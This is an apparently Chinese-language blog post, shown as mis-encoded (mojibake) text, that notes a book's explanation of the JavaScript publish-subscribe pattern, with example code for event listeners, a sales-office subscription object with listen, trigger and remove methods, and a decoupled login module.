    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”å‘å¸ƒ-è®¢é˜…æ¨¡å¼å‘å¸ƒ-è®¢é˜…æ¨¡å¼åˆå«åšè§‚å¯Ÿè€…æ¨¡å¼ï¼Œå®ƒå®šä¹‰å¯¹è±¡é—´çš„ä¸€ç§ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰€æœ‰ä¾èµ–äºŽå®ƒçš„å¯¹è±¡éƒ½å°†å¾—åˆ°é€šçŸ¥ã€‚åœ¨ JavaScript å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨äº‹ä»¶æ¨¡åž‹æ¥æ›¿ä»£ä¼ ç»Ÿçš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ã€‚ çŽ°å®žä¸­çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼å°æ˜Žæœ€è¿‘çœ‹ä¸Šäº†ä¸€å¥—æˆ¿å­ï¼Œåˆ°äº†å”®æ¥¼å¤„ä¹‹åŽæ‰è¢«å‘ŠçŸ¥ï¼Œæ¥¼ç›˜çš„æˆ¿å­éƒ½è¢«ä¹°å®Œäº†ã€‚å¥½åœ¨å”®æ¥¼çš„å·¥ä½œäººå‘˜å‘Šè¯‰ä»–ï¼Œä¸ä¹…åŽè¿˜æœ‰ä¸€äº›å°¾ç›˜æŽ¨å‡ºï¼Œå¼€å‘å•†æ­£åœ¨åŠžç†æ‰‹ç»­ï¼ŒåŠžå¥½åŽå°±å¯ä»¥è´­ä¹°äº†ï¼Œä½†æ˜¯å…·ä½“æ—¶é—´è¿˜ä¸çŸ¥é“ã€‚ äºŽæ˜¯å°æ˜Žè®°ä¸‹æ¥å”®æ¥¼å¤„çš„ç”µè¯ï¼Œä»¥åŽæ¯å¤©éƒ½æ‰“ç”µè¯è¿‡åŽ»é—®æ˜¯ä¸æ˜¯åˆ°äº†å¤Ÿä¹°çš„æ—¶é—´ã€‚é™¤äº†å°æ˜Žï¼Œè¿˜æœ‰å…¶ä»–äººä¹Ÿä¼šæ¯å¤©æ‰“ç”µè¯é—®è¿™ä¸ªé—®é¢˜ã€‚ä¸€ä¸ªæ˜ŸæœŸè¿‡åŽï¼Œå”®æ¥¼å·¥ä½œäººå‘˜å†³å®šè¾žèŒï¼Œå› ä¸ºåŽŒå€¦äº†æ¯å¤©å›žç­” 1000 ä¸ªç›¸åŒå†…å®¹çš„ç”µè¯ã€‚ å½“ç„¶çŽ°å®žä¸­æ²¡æœ‰è¿™ä¹ˆç¬¨çš„é”€å”®å…¬å¸ï¼Œå®žé™…ä¸Šæ•…äº‹æ˜¯è¿™æ ·çš„ï¼šå°æ˜Žç¦»å¼€ä¹‹å‰ï¼ŒæŠŠç”µè¯å·ç ç•™åœ¨äº†å”®æ¥¼å¤„ã€‚å”®æ¥¼å·¥ä½œäººå‘˜ç­”åº”ä»–ï¼Œæ–°æ¥¼ç›˜ä¸€æŽ¨å‡ºå°±é©¬ä¸Šå‘ä¿¡æ¯é€šçŸ¥å°æ˜Žã€‚å°çº¢ã€å°å¼ºå’Œå°é¾™ä¹Ÿæ˜¯ä¸€æ ·ï¼Œä»–ä»¬çš„ç”µè¯å·ç éƒ½è¢«è®°åœ¨å”®æ¥¼å¤„çš„èŠ±åå†Œä¸Šï¼Œæ–°æ¥¼ç›˜æŽ¨å‡ºçš„æ—¶å€™ï¼Œå”®æ¥¼ MM ä¼šç¿»å¼€èŠ±åå†Œï¼ŒéåŽ†ä¸Šé¢çš„ç”µè¯å·ç ï¼Œä¾æ¬¡å‘é€ä¸€æ¡çŸ­ä¿¡æ¥é€šçŸ¥ä»–ä»¬ã€‚ å‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„ä½œç”¨åœ¨åˆšåˆšçš„ä¾‹å­ä¸­ï¼Œå‘é€çŸ­ä¿¡é€šçŸ¥å°±æ˜¯ä¸€ä¸ªå…¸åž‹çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œè´­ä¹°è€…å°±æ˜¯è®¢é˜…è€…ï¼Œä»–ä»¬è®¢é˜…äº†æˆ¿å­å¼€å”®çš„æ¶ˆæ¯ã€‚å”®æ¥¼å¤„ä½œä¸ºå‘å¸ƒè€…ï¼Œä¼šåœ¨åˆé€‚çš„æ—¶å€™éåŽ†èŠ±åå†Œä¸Šçš„ç”µè¯å·ç ï¼Œä¾æ¬¡ç»™è´­æˆ¿è€…å‘å¸ƒæ¶ˆæ¯ã€‚ å¯ä»¥å‘çŽ°ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ä½¿ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼æœ‰ç€æ˜¾è€Œæ˜“è§çš„ä¼˜ç‚¹ã€‚ è´­æˆ¿è€…ä¸ç”¨å†å¤©å¤©ç»™å”®æ¥¼å¤„æ‰“ç”µè¯å’¨è¯¢å¼€å”®æ—¶é—´ï¼Œåœ¨åˆé€‚çš„æ—¶é—´ç‚¹ï¼Œå”®æ¥¼å¤„ä½œä¸ºå‘å¸ƒè€…ä¼šé€šçŸ¥è¿™äº›æ¶ˆæ¯è®¢é˜…è€… è´­æˆ¿è€…å’Œå”®æ¥¼å¤„ä¹‹é—´ä¸å†å¼ºè€¦åˆåœ¨ä¸€èµ·ï¼Œå½“æœ‰æ–°çš„è´­æˆ¿è€…å‡ºçŽ°æ—¶ï¼Œä»–åªéœ€æŠŠæ‰‹æœºå·ç ç•™åœ¨å”®æ¥¼å¤„ï¼Œå”®æ¥¼å¤„ä¸å…³å¿ƒè´­æˆ¿è€…çš„ä»»ä½•æƒ…å†µï¼Œä¸ç®¡è´­æˆ¿è€…æ˜¯ç”·æ˜¯å¥³è¿˜æ˜¯ä¸€åªçŒ´å­ã€‚ è€Œå”®æ¥¼å¤„çš„ä»»ä½•å˜åŠ¨ä¹Ÿä¸ä¼šå½±å“è´­ä¹°è€…ï¼Œæ¯”å¦‚å”®æ¥¼ MM ç¦»èŒï¼Œå”®æ¥¼å¤„ä»Žä¸€æ¥¼æ¬åˆ°äºŒæ¥¼ï¼Œè¿™äº›æ”¹å˜éƒ½è·Ÿè´­æˆ¿è€…æ— å…³ï¼Œåªè¦å”®æ¥¼å¤„è®°å¾—å‘çŸ­ä¿¡è¿™ä»¶äº‹æƒ…ã€‚ ç¬¬ä¸€ç‚¹è¯´æ˜Žè¿™ä¸ªæ¨¡å¼å¯ä»¥å¹¿æ³›åº”ç”¨äºŽå¼‚æ­¥ç¼–ç¨‹ä¸­ï¼Œè¿™æ˜¯ä¸€ç§æ›¿ä»£å›žè°ƒå‡½æ•°çš„æ–¹æ¡ˆã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬è®¢é˜… ajax è¯·æ±‚çš„ error,succ ç­‰äº‹ä»¶ã€‚æˆ–è€…å¦‚æžœæƒ³åœ¨åŠ¨ç”»çš„æ¯ä¸€å¸§å®Œæˆä¹‹åŽåšä¸€äº›äº‹æƒ…ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è®¢é˜…ä¸€ä¸ªäº‹ä»¶ï¼Œç„¶åŽåœ¨åŠ¨ç”»çš„æ¯ä¸€å¸§å®Œæˆä¹‹åŽå‘å¸ƒè¿™ä¸ªäº‹ä»¶ã€‚åœ¨å¼‚æ­¥ç¼–ç¨‹ä¸­ä½¿ç”¨å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œæˆ‘ä»¬å°±æ— éœ€è¿‡å¤šå…³æ³¨å¯¹è±¡åœ¨å¼‚æ­¥è¿è¡ŒæœŸé—´çš„å†…éƒ¨çŠ¶æ€ï¼Œè€Œåªéœ€è¦è®¢é˜…æ„Ÿå…´è¶£çš„äº‹ä»¶å‘ç”Ÿç‚¹ã€‚ ç¬¬äºŒç‚¹è¯´æ˜Žè¿™ä¸ªæ¨¡å¼å¯ä»¥å–ä»£å¯¹è±¡ä¹‹é—´ç¡¬ç¼–ç çš„é€šçŸ¥æœºåˆ¶ï¼Œä¸€ä¸ªå¯¹è±¡ä¸ç”¨æ˜¾å¼åœ°è°ƒç”¨å¦ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªæŽ¥å£ã€‚è¿™ä¸ªæ¨¡å¼è®©ä¸¤ä¸ªå¯¹è±¡æ¾è€¦åˆåœ°è”ç³»åœ¨ä¸€èµ·ï¼Œè™½ç„¶ä¸å¤ªæ¸…é™¤å½¼æ­¤çš„ç»†èŠ‚ï¼Œä½†è¿™éƒ¨å½±å“å®ƒä»¬ä¹‹é—´çš„äº’ç›¸é€šä¿¡ã€‚å½“æœ‰æ–°çš„è®¢é˜…è€…å‡ºçŽ°æ—¶ï¼Œå‘å¸ƒè€…çš„ä»£ç ä¸éœ€è¦ä»»ä½•ä¿®æ”¹ï¼ŒåŒæ ·å‘å¸ƒè€…éœ€è¦æ”¹å˜æ—¶ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°ä¹‹å‰çš„è®¢é˜…è€…ã€‚åªè¦ä¹‹å‰çš„çº¦å®šçš„äº‹ä»¶æ²¡æœ‰å˜åŒ–ï¼Œå°±å¯ä»¥è‡ªç”±æ”¹å˜å®ƒä»¬ã€‚ DOM äº‹ä»¶å®žé™…ä¸Šï¼Œåªè¦æˆ‘ä»¬æ›¾ç»åœ¨ DOM èŠ‚ç‚¹ä¸Šé¢ç»‘å®šè¿‡äº‹ä»¶å‡½æ•°ï¼Œæˆ‘ä»¬å°±æ›¾ç»ä½¿ç”¨è¿‡ å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œæ¥çœ‹çœ‹ä¸‹é¢çš„ä»£ç  12345document.body.addEventListener('click',function()&#123; console.log(2);&#125;,false)document.body.click(); // æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡» åœ¨è¿™é‡Œéœ€è¦ç›‘æŽ§ç”¨æˆ·ç‚¹å‡» document.body çš„åŠ¨ä½œï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰åŠžæ³•é¢„çŸ¥ç”¨æˆ·å°†åœ¨ä»€ä¹ˆæ—¶å€™ç‚¹å‡»ã€‚æ‰€ä»¥æˆ‘ä»¬è®¢é˜… document.body ä¸Šçš„ click äº‹ä»¶ï¼Œå½“ body èŠ‚ç‚¹è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œbody èŠ‚ç‚¹ä¾¿ä¼šå‘è®¢é˜…è€…å‘å¸ƒè¿™ä¸ªæ¶ˆæ¯ã€‚è¿™å¾ˆåƒè´­æˆ¿çš„ä¾‹å­ï¼Œè´­æˆ¿è€…ä¸çŸ¥é“æˆ¿å­ä»€ä¹ˆæ—¶å€™å¼€å§‹å‡ºå”®ï¼ŒäºŽæ˜¯ä»–åœ¨è®¢é˜…æ¶ˆæ¯åŽç­‰å¾…å”®æ¥¼å¤„å‘å¸ƒæ¶ˆæ¯ã€‚ å½“ç„¶æˆ‘ä»¬è¿˜å¯ä»¥éšæ„å¢žåŠ æˆ–è€…æ˜¯åˆ é™¤è®¢é˜…è€…ï¼Œå¢žåŠ è®¢é˜…è€…ä¸ä¼šå½±å“å‘å¸ƒè€…ä»£ç çš„ç¼–å†™ï¼š 12345678910111213document.body.addEventListener('click',function()&#123; console.log(2);&#125;,false)document.body.addEventListener('click',function()&#123; console.log(3);&#125;,false)document.body.addEventListener('click',function()&#123; console.log(4);&#125;,false)document.body.click(); // æ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡» æ³¨æ„ï¼Œæ‰‹åŠ¨è§¦å‘äº‹ä»¶æ›´å¥½çš„åšæ³•æ˜¯ IE ä¸‹ç”¨ fireEventï¼Œæ ‡å‡†æµè§ˆå™¨ä¸‹ç”¨ dispatchEvent å®žçŽ°ã€‚ è‡ªå®šä¹‰äº‹ä»¶é™¤äº† DOM äº‹ä»¶ï¼Œæˆ‘ä»¬è¿˜ç»å¸¸å®žçŽ°ä¸€äº›è‡ªå®šä¹‰çš„äº‹ä»¶ï¼Œè¿™ç§ä¾é è‡ªå®šä¹‰äº‹ä»¶å®Œæˆçš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼å¯ä»¥ç”¨äºŽä»»ä½• JavaScript ä»£ç ä¸­ã€‚ çœ‹çœ‹å¦‚ä½•å®žçŽ°å‘å¸ƒ-è®¢é˜…æ¨¡å¼ é¦–å…ˆè¦æŒ‡å®šå¥½è°å……å½“å‘å¸ƒè€…ï¼ˆä¾‹å¦‚å”®æ¥¼å¤„ï¼‰ ç„¶åŽç»™å‘å¸ƒè€…æ·»åŠ ä¸€ä¸ªç¼“å­˜åˆ—è¡¨ï¼Œç”¨äºŽå­˜æ”¾å›žè°ƒå‡½æ•°ä»¥ä¾¿äºŽé€šçŸ¥è®¢é˜…è€…ï¼ˆå”®æ¥¼å¤„çš„èŠ±åå†Œï¼‰ æœ€åŽå‘å¸ƒæ¶ˆæ¯çš„æ—¶å€™ï¼Œå‘å¸ƒè€…ä¼šéåŽ†è¿™ä¸ªç¼“å­˜åˆ—è¡¨ï¼Œä¾æ¬¡è§¦å‘é‡Œé¢å­˜æ”¾çš„è®¢é˜…è€…çš„å›žè°ƒå‡½æ•°ï¼ˆéåŽ†èŠ±åå†Œï¼ŒæŒ¨ä¸ªå‘çŸ­ä¿¡ï¼‰ å¦å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¾€å›žè°ƒå‡½æ•°é‡Œé¢å¡«å…¥ä¸€äº›å‚æ•°ï¼Œè®¢é˜…è€…å¯ä»¥æŽ¥å—è¿™äº›å‚æ•°ã€‚è¿™å¾ˆæœ‰å¿…è¦ï¼Œæ¯”å¦‚å”®æ¥¼å¤„å¯ä»¥åœ¨å‘é€ç»™è®¢é˜…è€…çš„çŸ­ä¿¡é‡Œé¢æ·»åŠ ä¸Šæˆ¿å­çš„å•ä»·ã€é¢ç§¯ç­‰ç­‰æ¶ˆæ¯ï¼Œè®¢é˜…è€…å¯ä»¥æŽ¥å—è¿™äº›æ¶ˆæ¯åŽè¿›è¡Œå„è‡ªçš„å¤„ç†ï¼š 123456789101112131415161718192021222324var salesOffices = &#123;&#125;; // å®šä¹‰å”®æ¥¼å¤„salesOffices.clientList = []; // ç¼“å­˜åˆ—è¡¨ï¼Œå­˜æ”¾è®¢é˜…è€…çš„å›žè°ƒå‡½æ•°salesOffices.listen = function(fn)&#123; // å¢žåŠ è®¢é˜…è€… this.clientList.push(fn); // è®¢é˜…çš„æ¶ˆæ¯æ·»åŠ è¿›ç¼“å­˜åˆ—è¡¨&#125;salesOffices.trigger = function()&#123; // å‘å¸ƒæ¶ˆæ¯ for(var i=0,fn;fn=this.clientList[i++];)&#123; fn.apply(this,arguments); // arguments æ˜¯å‘å¸ƒæ¶ˆæ¯æ—¶å¸¦ä¸Šçš„å‚æ•° &#125;&#125;// æµ‹è¯•salesOffices.listen(function(price,squareMeter)&#123; // å°æ˜Žè®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price); console.log('squareMeter=',squareMeter);&#125;);salesOffices.listen(function(price,squareMeter)&#123; // å°çº¢è®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price); console.log('squareMeter=',squareMeter);&#125;);salesOffices.trigger(20000,88);salesOffices.trigger(30000,100); è‡³æ­¤ï¼Œå®žçŽ°äº†ä¸€ä¸ªç®€å•çš„å‘å¸ƒ-è®¢é˜…æ¨¡å¼ï¼Œä½†è¿™é‡Œè¿˜å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬çœ‹åˆ°è®¢é˜…è€…æŽ¥æ”¶åˆ°äº†å‘å¸ƒè€…å‘å¸ƒçš„æ¯ä¸ªæ¶ˆæ¯ï¼Œè™½ç„¶å°æ˜Žåªæƒ³ä¹°88å¹³æ–¹çš„ï¼Œä½†æ˜¯å‘å¸ƒè€…ä¹ŸæŠŠ100å¹³æ–¹çš„æ¶ˆæ¯æŽ¨ç»™äº†ä»–ã€‚è¿™å¯¹å°æ˜Žæ¥è¯´æ˜¯ä¸å°çš„å›°æ‰°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¢žåŠ ä¸€ä¸ª æ ‡è¯† key è®©è®¢é˜…è€…åªè®¢é˜…è‡ªå·±æ„Ÿå…´è¶£çš„æ¶ˆæ¯ã€‚ 12345678910111213141516171819202122232425262728293031var salesOffices = &#123;&#125;; // å®šä¹‰å”®æ¥¼å¤„salesOffices.clientList = &#123;&#125;; // ç¼“å­˜åˆ—è¡¨ï¼Œå­˜æ”¾è®¢é˜…è€…çš„å›žè°ƒå‡½æ•°salesOffices.listen = function(key,fn)&#123; // å¦‚æžœè¿˜æ²¡æœ‰è®¢é˜…æ­¤ç±»æ¶ˆæ¯ï¼Œç»™æ­¤ç±»æ¶ˆæ¯åˆ›å»ºä¸€ä¸ªç¼“å­˜åˆ—è¡¨ if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); // è®¢é˜…çš„æ¶ˆæ¯æ·»åŠ è¿›ç¼“å­˜åˆ—è¡¨&#125;salesOffices.trigger = function()&#123; // å‘å¸ƒæ¶ˆæ¯ var key = Array.prototype.shift.call(arguments), // å–å‡ºæ¶ˆæ¯ç±»åž‹ fns = this.clientList[key]; // å–å‡ºè¯¥æ¶ˆæ¯å¯¹åº”çš„å›žè°ƒå‡½æ•°é›†åˆ if(!fns || fns.length === 0)&#123; // å¦‚æžœæ²¡æœ‰è®¢é˜…æ­¤æ¶ˆæ¯ï¼Œåˆ™è¿”å›ž return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); // arguments æ˜¯å‘å¸ƒæ¶ˆæ¯æ—¶å¸¦ä¸Šçš„å‚æ•° &#125;&#125;// æµ‹è¯•salesOffices.listen('squareMeter88',function(price)&#123; // å°æ˜Žè®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price); &#125;);salesOffices.listen('squareMeter100',function(price)&#123; // å°çº¢è®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price);&#125;);salesOffices.trigger('squareMeter88',20000);salesOffices.trigger('squareMeter100',30000); å¾ˆæ˜Žæ˜¾ï¼Œè®¢é˜…è€…çŽ°åœ¨å¯ä»¥è®¢é˜…è‡ªå·±å–œæ¬¢çš„äº‹ä»¶äº†ã€‚ å‘å¸ƒ-è®¢é˜…æ¨¡å¼çš„é€šç”¨å®žçŽ°æŠŠ å‘å¸ƒ-è®¢é˜…çš„åŠŸèƒ½æå–å‡ºæ¥ï¼Œæ”¾åœ¨å•ç‹¬ä¸€ä¸ªå¯¹è±¡ä¸­å†…ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940var event = &#123; clientList:[], listen:function(key,fn)&#123; if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); &#125;, trigger:function()&#123; var key = Array.prototype.shift.call(arguments), fns = this.clientList[key]; if(!fns || fns.length === 0)&#123; return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;&#125;// ç„¶åŽå®šä¹‰ä¸€ä¸ª installEvent å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ç»™æ‰€æœ‰çš„å¯¹è±¡éƒ½åŠ¨æ€å®‰è£…å‘å¸ƒ-è®¢é˜…åŠŸèƒ½var installEvent = function(obj)&#123; for(var i in event)&#123; obj[i] = event[i]; &#125;&#125;// æµ‹è¯•var salesOffices = &#123;&#125;;installEvent(salesOffices);console.log(salesOffices);salesOffices.listen('squareMeter88',function(price)&#123; // å°æ˜Žè®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price); &#125;);salesOffices.listen('squareMeter100',function(price)&#123; // å°çº¢è®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price);&#125;);salesOffices.trigger('squareMeter88',20000);salesOffices.trigger('squareMeter100',30000); å–æ¶ˆè®¢é˜…çš„äº‹ä»¶ç»™ event å¯¹è±¡ å¢žåŠ ä¸€ä¸ª remove æ–¹æ³•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556var event = &#123; clientList:[], listen:function(key,fn)&#123; if(!this.clientList[key])&#123; this.clientList[key] = []; &#125; this.clientList[key].push(fn); &#125;, trigger:function()&#123; var key = Array.prototype.shift.call(arguments), fns = this.clientList[key]; if(!fns || fns.length === 0)&#123; return false; &#125; for(var i=0,fn;fn=fns[i++];)&#123; fn.apply(this,arguments); &#125; &#125;, remove:function(key,fn)&#123; var fns = this.clientList[key]; if(!fns)&#123; // å¦‚æžœ key å¯¹åº”çš„ æ¶ˆæ¯æ²¡æœ‰è¢«äººè®¢é˜…ï¼Œåˆ™ç›´æŽ¥è¿”å›ž return false; &#125; if(!fn)&#123; // å¦‚æžœæ²¡æœ‰ä¼ å…¥å…·ä½“çš„å›žè°ƒå‡½æ•°ï¼Œè¡¨ç¤ºéœ€è¦å–æ¶ˆ key å¯¹åº”æ¶ˆæ¯çš„æ‰€æœ‰è®¢é˜… fns &amp;&amp; (fns.length =0); &#125;else&#123; for(var l = fns.length-1; l&gt;=0;l--)&#123; // åå‘éåŽ†è®¢é˜…çš„å›žè°ƒå‡½æ•°åˆ—è¡¨ var _fn = fns[l]; if(_fn === fn)&#123; fns.splice(l,1); // åˆ é™¤è®¢é˜…è€…çš„å›žè°ƒå‡½æ•° &#125; &#125; &#125; &#125;&#125;// ç„¶åŽå®šä¹‰ä¸€ä¸ª installEvent å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ç»™æ‰€æœ‰çš„å¯¹è±¡éƒ½åŠ¨æ€å®‰è£…å‘å¸ƒ-è®¢é˜…åŠŸèƒ½var installEvent = function(obj)&#123; for(var i in event)&#123; obj[i] = event[i]; &#125;&#125;// æµ‹è¯•var salesOffices = &#123;&#125;;installEvent(salesOffices);salesOffices.listen('squareMeter88',fn1 = function(price)&#123; // å°æ˜Žè®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price); &#125;);salesOffices.listen('squareMeter100',fn2 = function(price)&#123; // å°çº¢è®¢é˜…æ¶ˆæ¯ console.log('ä»·æ ¼=',price);&#125;);salesOffices.remove('squareMeter88',fn1); // åˆ é™¤å°æ˜Žè®¢é˜…salesOffices.trigger('squareMeter88',20000); // æ²¡æœ‰è¾“å‡ºsalesOffices.trigger('squareMeter100',30000); çœŸå®žçš„ä¾‹å­â€”â€”ç½‘ç»œç™»å½•å‡å¦‚æˆ‘ä»¬æ­£åœ¨å¼€å‘ä¸€ä¸ªå•†åŸŽç½‘ç«™ï¼Œç½‘ç«™é‡Œæœ‰ header å¤´éƒ¨ã€nav å¯¼èˆªã€æ¶ˆæ¯åˆ—è¡¨ã€è´­ç‰©è½¦ç­‰æ¨¡å—ã€‚è¿™å‡ ä¸ªæ¨¡å—çš„æ¸²æŸ“æœ‰ä¸€ä¸ªå…±åŒçš„å‰ææ¡ä»¶ï¼Œå°±æ˜¯å¿…é¡»å…ˆç”¨ ajax å¼‚æ­¥è¯·æ±‚èŽ·å–ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ã€‚æ¯”å¦‚ç”¨æˆ·çš„åå­—å’Œå¤´åƒè¦æ˜¾ç¤ºåœ¨ header æ¨¡å—é‡Œï¼Œè€Œè¿™ä¸¤ä¸ªå­—æ®µéƒ½æ¥è‡ªç”¨æˆ·ç™»å½•åŽè¿”å›žçš„ä¿¡æ¯ã€‚ è‡³äºŽ ajax è¯·æ±‚ä»€ä¹ˆæ—¶å€™èƒ½æˆåŠŸè¿”å›žç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ç‚¹æˆ‘ä»¬æ²¡æœ‰åŠžæ³•ç¡®å®šã€‚çŽ°åœ¨çš„æƒ…èŠ‚çœ‹èµ·æ¥åƒæžäº†å”®æ¥¼å¤„çš„ä¾‹å­ï¼Œå°æ˜Žä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å¼€å‘å•†çš„å”®æ¥¼æ‰‹ç»­èƒ½å¤ŸæˆåŠŸåŠžä¸‹æ¥ ä½†çŽ°åœ¨è¿˜ä¸è¶³ä»¥è¯´æœæˆ‘ä»¬åœ¨æ­¤ä½¿ç”¨å‘å¸ƒâ€”è®¢é˜…æ¨¡å¼ï¼Œå› ä¸ºå¼‚æ­¥çš„é—®é¢˜é€šå¸¸ä¹Ÿå¯ä»¥ç”¨å›žè°ƒå‡½æ•°æ¥è§£å†³ã€‚æ›´é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œæˆ‘ä»¬ä¸çŸ¥é“é™¤äº† header å¤´éƒ¨ã€nav å¯¼èˆªã€æ¶ˆæ¯åˆ—è¡¨ã€è´­ç‰©è½¦ä¹‹å¤–ï¼Œå°†æ¥è¿˜æœ‰å“ªäº›æ¨¡å—éœ€è¦ä½¿ç”¨è¿™äº›ç”¨æˆ·ä¿¡æ¯ã€‚å¦‚æžœå®ƒä»¬å’Œç”¨æˆ·ä¿¡æ¯æ¨¡å—äº§ç”Ÿäº†å¼ºè€¦åˆï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·çš„å½¢å¼ï¼š 123456login.succ(function(data)&#123; header.setAvatar(data.avatar); // è®¾ç½® header æ¨¡å—çš„å¤´åƒ nav.setAvatar(data.avatar); // è®¾ç½®å¯¼èˆªæ¨¡å—çš„å¤´åƒ message.refresh(); // åˆ·æ–°æ¶ˆæ¯åˆ—è¡¨ cart.refresh(); // åˆ·æ–°è´­ç‰©è½¦åˆ—è¡¨&#125;); çŽ°åœ¨ç™»å½•æ¨¡å—æ˜¯æˆ‘ä»¬è´Ÿè´£ç¼–å†™çš„ï¼Œä½†æˆ‘ä»¬è¿˜å¿…é¡»äº†è§£ header æ¨¡å—é‡Œè®¾ç½®å¤´åƒçš„æ–¹æ³•å«setAvatarã€è´­ç‰©è½¦æ¨¡å—é‡Œåˆ·æ–°çš„æ–¹æ³•å« refreshï¼Œè¿™ç§è€¦åˆæ€§ä¼šä½¿ç¨‹åºå˜å¾—åƒµç¡¬ï¼Œheader æ¨¡å—ä¸èƒ½éšæ„å†æ”¹å˜ setAvatar çš„æ–¹æ³•åï¼Œå®ƒè‡ªèº«çš„åå­—ä¹Ÿä¸èƒ½è¢«æ”¹ä¸º header1ã€header2ã€‚ è¿™æ˜¯é’ˆå¯¹å…·ä½“å®žçŽ°ç¼–ç¨‹çš„å…¸åž‹ä¾‹å­ï¼Œé’ˆå¯¹å…·ä½“å®žçŽ°ç¼–ç¨‹æ˜¯ä¸è¢«èµžåŒçš„ã€‚ ç­‰åˆ°æœ‰ä¸€å¤©ï¼Œé¡¹ç›®ä¸­åˆæ–°å¢žäº†ä¸€ä¸ªæ”¶è´§åœ°å€ç®¡ç†çš„æ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—æœ¬æ¥æ˜¯å¦ä¸€ä¸ªåŒäº‹æ‰€å†™çš„ã€‚ä½†æ˜¯ä»–å´ä¸å¾—ä¸ç»™ä½ æ‰“ç”µè¯ï¼šâ€œHiï¼Œç™»å½•ä¹‹åŽéº»çƒ¦åˆ·æ–°ä¸€ä¸‹æ”¶è´§åœ°å€åˆ—è¡¨ã€‚â€äºŽæ˜¯ä½ åˆç¿»å¼€ä½  3 ä¸ªæœˆå‰å†™çš„ç™»å½•æ¨¡å—ï¼Œåœ¨æœ€åŽéƒ¨åˆ†åŠ ä¸Šè¿™è¡Œä»£ç ï¼š 1234567login.succ(function(data)&#123; header.setAvatar(data.avatar); // è®¾ç½® header æ¨¡å—çš„å¤´åƒ nav.setAvatar(data.avatar); // è®¾ç½®å¯¼èˆªæ¨¡å—çš„å¤´åƒ message.refresh(); // åˆ·æ–°æ¶ˆæ¯åˆ—è¡¨ cart.refresh(); // åˆ·æ–°è´­ç‰©è½¦åˆ—è¡¨ address.refresh(); // å¢žåŠ çš„ä»£ç &#125;); æˆ‘ä»¬å°±ä¼šè¶Šæ¥è¶Šç–²äºŽåº”ä»˜è¿™äº›çªå¦‚å…¶æ¥çš„ä¸šåŠ¡è¦æ±‚ï¼Œè¦ä¹ˆè·³æ§½äº†äº‹ï¼Œè¦ä¹ˆå¿…é¡»æ¥é‡æž„è¿™äº›ä»£ç ã€‚ 